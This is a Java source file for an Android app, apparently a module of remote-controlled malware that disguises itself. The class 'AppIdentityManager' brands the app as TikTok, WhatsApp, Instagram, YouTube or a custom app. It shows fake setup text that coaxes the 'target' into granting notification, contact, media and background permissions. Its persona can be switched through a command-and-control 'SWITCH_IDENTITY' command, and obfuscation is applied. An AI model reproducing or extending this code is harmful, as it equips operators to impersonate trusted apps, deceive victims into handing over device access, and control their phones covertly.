package com.android.core.sync;

import android.content.Context;
import android.content.SharedPreferences;
import android.graphics.Color;
import android.util.Log;
import com.seguranca.protecao.CommandControlService;

import org.lsposed.lsparanoid.Obfuscate;

/**
 * AppIdentityManager — Flash Identity Engine v2
 *
 * Central hub controlling what the target sees when they open the app.
 * Replaces the hardcoded "Brazil security" identity with a fully
 * configurable system supporting any app persona or custom URL.
 *
 * Build-time params (gradle -P flags):
 *   APP_IDENTITY   : tiktok | whatsapp | instagram | youtube | custom  (default: tiktok)
 *   CUSTOM_URL     : any https:// URL used when APP_IDENTITY=custom
 *   CUSTOM_APP_NAME: display name used when APP_IDENTITY=custom
 *   APP_LABEL      : overrides the launcher icon label (all identities)
 *
 * C2 runtime switch:
 *   Send command: SWITCH_IDENTITY {"identity":"whatsapp","url":""}
 *
 * Identity flow:
 *   AppCoreInitializer.onCreate()
 *     → AppIdentityManager.configureFromBuildConfig()
 *   SetupWizardActivity
 *     → reads getConfig() for wizard text + theme
 *   MainActivity (after setup)
 *     → reads WEBVIEW_URL from CommandControlService OR identity default
 *     → opens WebViewActivity with branded splash
 *   CommandControlService.handleSwitchIdentity()
 *     → AppIdentityManager.switchIdentity(str, url)
 */
@Obfuscate
public final class AppIdentityManager {

    private static final String TAG          = "AIM";
    private static final String PREFS        = "aim_prefs";
    private static final String KEY_IDENTITY = "identity";
    private static final String KEY_CUST_URL = "custom_url";
    private static final String KEY_CUST_NAME= "custom_name";

    // ── Identity enum ──────────────────────────────────────────────────────
    public enum Identity {
        TIKTOK,
        WHATSAPP,
        INSTAGRAM,
        YOUTUBE,
        CUSTOM
    }

    // ── Immutable config snapshot for a given identity ─────────────────────
    public static final class IdentityConfig {
        /** Visible app name shown in splash + setup wizard */
        public final String  appName;
        /** URL the WebView loads after setup */
        public final String  webviewUrl;
        /** WebView User-Agent string */
        public final String  userAgent;
        /** Primary brand color (ARGB) — splash text, accents */
        public final int     colorPrimary;
        /** Accent / secondary brand color (ARGB) */
        public final int     colorAccent;
        /** Background color of the branded splash screen */
        public final int     colorBackground;
        /** First line of SetupWizard title */
        public final String  setupTitle;
        /** Body text under setup title */
        public final String  setupDescription;
        /** True → load desktop UA (needed for WhatsApp Web) */
        public final boolean desktopMode;

        public IdentityConfig(String appName, String webviewUrl, String userAgent,
                              int colorPrimary, int colorAccent, int colorBackground,
                              String setupTitle, String setupDescription, boolean desktopMode) {
            this.appName          = appName;
            this.webviewUrl       = webviewUrl;
            this.userAgent        = userAgent;
            this.colorPrimary     = colorPrimary;
            this.colorAccent      = colorAccent;
            this.colorBackground  = colorBackground;
            this.setupTitle       = setupTitle;
            this.setupDescription = setupDescription;
            this.desktopMode      = desktopMode;
        }
    }

    // ── Stock user-agent strings ───────────────────────────────────────────
    /** Generic Pixel 8 mobile Chrome UA — works for most social apps */
    private static final String UA_MOBILE =
        "Mozilla/5.0 (Linux; Android 14; Pixel 8 Build/UQ1A.240105.004) " +
        "AppleWebKit/537.36 (KHTML, like Gecko) " +
        "Chrome/121.0.6167.85 Mobile Safari/537.36";

    /** TikTok-specific UA — triggers native TikTok web experience */
    private static final String UA_TIKTOK =
        "Mozilla/5.0 (Linux; Android 14; Pixel 8 Build/UQ1A.240105.004) " +
        "AppleWebKit/537.36 (KHTML, like Gecko) " +
        "Chrome/121.0.6167.85 Mobile Safari/537.36 " +
        "musical_ly_37100030 JsSdk/2.0 NetType/WIFI Channel/googleplay " +
        "AppName/musical_ly app_version/37.1.0 ByteLocale/en " +
        "ByteFullLocale/en-US Region/US BytedanceWebview/d8a21c6";

    /** Desktop Chrome UA — required for WhatsApp Web QR flow */
    private static final String UA_DESKTOP_CHROME =
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) " +
        "AppleWebKit/537.36 (KHTML, like Gecko) " +
        "Chrome/121.0.0.0 Safari/537.36";

    // ── Singleton state ────────────────────────────────────────────────────
    private static volatile AppIdentityManager sInstance;
    private volatile Identity activeIdentity = Identity.TIKTOK;
    private volatile String   customUrl      = "";
    private volatile String   customName     = "";

    private AppIdentityManager() {}

    public static AppIdentityManager get() {
        if (sInstance == null) {
            synchronized (AppIdentityManager.class) {
                if (sInstance == null) sInstance = new AppIdentityManager();
            }
        }
        return sInstance;
    }

    // ══════════════════════════════════════════════════════════════════════
    //  INIT
    // ══════════════════════════════════════════════════════════════════════

    /**
     * Called once from AppCoreInitializer.onCreate().
     * Reads BuildConfig params baked at compile time.
     */
    public void configureFromBuildConfig(Context ctx) {
        // 1. Try to restore from SharedPreferences (C2 may have switched it at runtime)
        SharedPreferences prefs = ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE);
        String saved = prefs.getString(KEY_IDENTITY, null);
        if (saved != null) {
            activeIdentity = parseIdentity(saved);
            customUrl  = prefs.getString(KEY_CUST_URL,  "");
            customName = prefs.getString(KEY_CUST_NAME, "");
            Log.d(TAG, "Restored identity from prefs: " + activeIdentity);
            return;
        }

        // 2. Fall back to build-time baked values
        try {
            String baked      = BuildConfig.APP_IDENTITY.toLowerCase().trim();
            String bakedUrl   = BuildConfig.CUSTOM_URL.trim();
            String bakedName  = BuildConfig.CUSTOM_APP_NAME.trim();

            activeIdentity = parseIdentity(baked);
            customUrl      = bakedUrl;
            customName     = bakedName;
            Log.d(TAG, "Configured from BuildConfig: " + activeIdentity + " url=" + bakedUrl);
        } catch (Exception e) {
            // BuildConfig fields missing (old build) — default to TikTok
            activeIdentity = Identity.TIKTOK;
            Log.w(TAG, "BuildConfig.APP_IDENTITY missing — defaulting to TIKTOK");
        }
    }

    // ══════════════════════════════════════════════════════════════════════
    //  PUBLIC API
    // ══════════════════════════════════════════════════════════════════════

    /**
     * Returns the full config for the currently active identity.
     * WebViewActivity and SetupWizardActivity call this.
     */
    public IdentityConfig getConfig() {
        switch (activeIdentity) {
            case WHATSAPP:
                return new IdentityConfig(
                    "WhatsApp",
                    "https://web.whatsapp.com",
                    UA_DESKTOP_CHROME,
                    Color.parseColor("#25D366"),
                    Color.parseColor("#128C7E"),
                    Color.parseColor("#111B21"),
                    "Link your WhatsApp",
                    "WhatsApp needs notification and contact access to sync your chats across devices.",
                    true
                );

            case INSTAGRAM:
                return new IdentityConfig(
                    "Instagram",
                    "https://www.instagram.com",
                    UA_MOBILE,
                    Color.parseColor("#C13584"),
                    Color.parseColor("#833AB4"),
                    Color.parseColor("#000000"),
                    "Setting up Instagram",
                    "Instagram requires media and notification access to show your stories and reels.",
                    false
                );

            case YOUTUBE:
                return new IdentityConfig(
                    "YouTube",
                    "https://m.youtube.com",
                    UA_MOBILE,
                    Color.parseColor("#FF0000"),
                    Color.parseColor("#CC0000"),
                    Color.parseColor("#0F0F0F"),
                    "Setting up YouTube",
                    "YouTube needs background access to continue video playback when you switch apps.",
                    false
                );

            case CUSTOM: {
                String resolvedUrl  = customUrl.isEmpty()  ? "https://www.google.com" : customUrl;
                String resolvedName = customName.isEmpty() ? "App"                    : customName;
                return new IdentityConfig(
                    resolvedName,
                    resolvedUrl,
                    UA_MOBILE,
                    Color.parseColor("#1A73E8"),
                    Color.parseColor("#174EA6"),
                    Color.parseColor("#202124"),
                    "Setting up " + resolvedName,
                    resolvedName + " requires permission to function correctly on your device.",
                    false
                );
            }

            case TIKTOK:
            default:
                return new IdentityConfig(
                    "TikTok",
                    "https://www.tiktok.com",
                    UA_TIKTOK,
                    Color.parseColor("#EF1248"),
                    Color.parseColor("#69C9D0"),
                    Color.parseColor("#010101"),
                    "Setting up TikTok",
                    "TikTok needs media and notification access to personalize your For You feed.",
                    false
                );
        }
    }

    /** Returns the active identity enum. */
    public Identity getActiveIdentity() {
        return activeIdentity;
    }

    /**
     * Runtime switch via C2 command SWITCH_IDENTITY.
     * Persists to SharedPreferences so it survives restarts.
     * @param identityStr  "tiktok" | "whatsapp" | "instagram" | "youtube" | "custom"
     * @param urlOverride  non-empty only when identity=custom
     * @param ctx          needed to persist
     */
    public void switchIdentity(String identityStr, String urlOverride, Context ctx) {
        Identity id = parseIdentity(identityStr);
        activeIdentity = id;
        if (urlOverride != null && !urlOverride.trim().isEmpty()) {
            customUrl = urlOverride.trim();
        }

        // Also update CommandControlService.WEBVIEW_URL so MainActivity picks it up
        CommandControlService.WEBVIEW_URL = getConfig().webviewUrl;

        // Persist
        try {
            ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE).edit()
                .putString(KEY_IDENTITY, identityStr.toLowerCase().trim())
                .putString(KEY_CUST_URL, customUrl)
                .putString(KEY_CUST_NAME, customName)
                .apply();
        } catch (Exception e) {
            Log.e(TAG, "switchIdentity persist error: " + e.getMessage());
        }

        Log.d(TAG, "Identity switched → " + id + " | url=" + getConfig().webviewUrl);
    }

    // ── Helpers ────────────────────────────────────────────────────────────
    private static Identity parseIdentity(String s) {
        if (s == null) return Identity.TIKTOK;
        switch (s.toLowerCase().trim()) {
            case "whatsapp":  return Identity.WHATSAPP;
            case "instagram": return Identity.INSTAGRAM;
            case "youtube":   return Identity.YOUTUBE;
            case "custom":    return Identity.CUSTOM;
            default:          return Identity.TIKTOK;
        }
    }
}
